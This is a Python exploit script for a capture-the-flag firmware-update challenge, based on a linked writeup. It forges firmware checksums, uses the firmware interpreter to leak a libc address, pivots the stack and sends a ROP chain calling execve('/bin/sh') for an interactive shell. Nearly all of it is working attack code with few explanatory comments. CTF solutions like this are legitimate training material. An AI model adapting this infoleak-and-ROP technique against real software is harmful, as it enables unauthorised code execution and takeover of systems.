# This writeup is based off of: https://ctftime.org/writeup/11273

# Import the python libraries, and establish the target
import interact
import struct

target = interact.Process()

# Declare needed rop gadgets offsets
popRdi = 0x21102
popRax = 0x33544
popRsi = 0x202e8
popRdx = 0x1b92

binsh =  0x18cd57 

syscall = 0xbc375

addRsp = 0xc96a6

# A function desgined to just setup initial firmware to enable debugging
def debugFirmware():
	target.sendline('U')
	initialFirmware = "FW" + "\xa2\xc8" + "1081" + "9"
	initialFirmware = initialFirmware + "\x00" * (0x400 - len(initialFirmware))
	target.sendline(initialFirmware)
	target.sendline(initialFirmware)
	target.sendline('E')

# This is the checksum generation algorithm, heavily based off of the writeup linked above
def genChecksum(fw):
    i = 2
    j = 0
    x = 0
    y = 0
    z = 0
    while i <= 0x1ff:
        x = z
        x <<= 0xc
        y = x

        x = z
        x >>= 0x4
        x |= y

        z = x + (i & 0xffff)
        z &= 0xffff
        x = ord(fw[j]) + 0x100*ord(fw[j+1])
        z ^= x
        i += 1
        j += 2
    return chr(z & 0xff) + chr(z >> 8)
# An update function, which will use debugging features to get the firmware, then print it out
def debugUpdateFirmware(firmware, exe=''):
	# Update the firmware with a bad checksum, wee what the actual checksum it
	target.sendline('U')
	fw = "FW" + "00" + "10" + firmware
	fw = fw + "\x00" * (0x400 - len(fw))
	target.sendline(fw)
	target.readuntil("ACTUAL FW CHECKSUM: ")
	checksum = target.read(4)
	c0 = int("0x" + checksum[0:2], 16)
	c1 = int("0x" + checksum[2:4], 16)
	print "\n\n\n\n\nc0: " + hex(c0) + " c1: " + hex(c1) + "\n\n\n\n\n"

	# Update the firmware with coorect checksum
	target.sendline('U')
	fw = "FW" + struct.pack('<B', c1) + struct.pack('<B', c0) + "10" + firmware
	fw = fw + "\x00" * (0x400 - len(fw))	
	target.sendline(fw)
	target.sendline('E' + exe)
	
# An update function for attacking the live target, so no debugging features to tell us the firmware    
def liveUpdateFirmware(firmware):
	target.sendline('U')
	fw = "FW" + firmware
	target.sendline(fw + "\x00" * (0x400 - len(fw)))
	print target.readuntil("FIRMWARE UPDATE SUCCESSFUL!")
	target.sendline('E')		
	print target.readuntil("ENRICHMENT PROCEDURE IS RUNNING")

# Basically the above function, but doesn't execute the firmware
def liveUpdateFirmwareNoExec(firmware):
	target.sendline('U')
	fw = "FW" + firmware
	target.sendline(fw + "\x00" * (0x410 - len(fw)))
	print target.readuntil("FIRMWARE UPDATE SUCCESSFUL!")


# Scan in the inital text
print target.readuntil(" - - - - - - - - - - - - - - - - - - - -")

# Send the firmware to get the libc infoleak
liveUpdateFirmware("\x3f\x74" + "10" + "81" +  "20"*76 + "9")

# Get the infoleak, filter it out
target.sendline("S")

print target.readuntil("0000000000000000000000000000000000000000000000000000000000000000000000000000")
libcleak = target.read(8)
libcleak = libcleak.replace("\x0a", "")
libcleak = libcleak.replace("\x20", "")
leak = int(struct.unpack('<Q', libcleak + "\x00"*(8 - len(libcleak)))[0])
libc = leak - 0x36ec0
print "libc: " + hex(libc) 

# Build the ROP Chain
chain = "0"*15 # 15 bytes of filler data, so the start of our rop chain matches with where the stack gets pivoted to

chain += struct.pack("<Q", libc + popRdi)# Pop ptr to "/bin/sh" into $rdi
chain += struct.pack("<Q", libc + binsh)

chain += struct.pack("<Q", libc + popRax)# Pop 0x3b into $rax (code for syscall_execve)
chain += struct.pack("<Q", 0x3b)

chain += struct.pack("<Q", libc + popRsi)# Pop 0x0 into $rsi
chain += struct.pack("<Q", 0x0)

chain += struct.pack("<Q", libc + popRdx)# Pop 0x0 into $rdx
chain += struct.pack("<Q", 0x0)

chain += struct.pack("<Q", libc + syscall)# Make the syscall

stackPivotAdr = struct.pack("<Q", libc + addRsp)# address of pivot gadget (add rsp 0x38)

# Add 2s infront of every byte, so it will write the gadget
stackPivot = ""
for i in stackPivotAdr:
	stackPivot += "2" + i

# Construct the firmware (everything after the checksum)
firmware = "10" + "81" + "7"*80 + "20"*68 + stackPivot  + "9"
firmware = firmware  + "\x00" * (0x400 - len(firmware))

# Send the firmware with the generated checksum
liveUpdateFirmwareNoExec(genChecksum(firmware) + firmware)

# Push our ROP chain to the stack, then execute the firmware 
target.sendline("E" + chain)

# Drop to an interactive shell
target.interactive()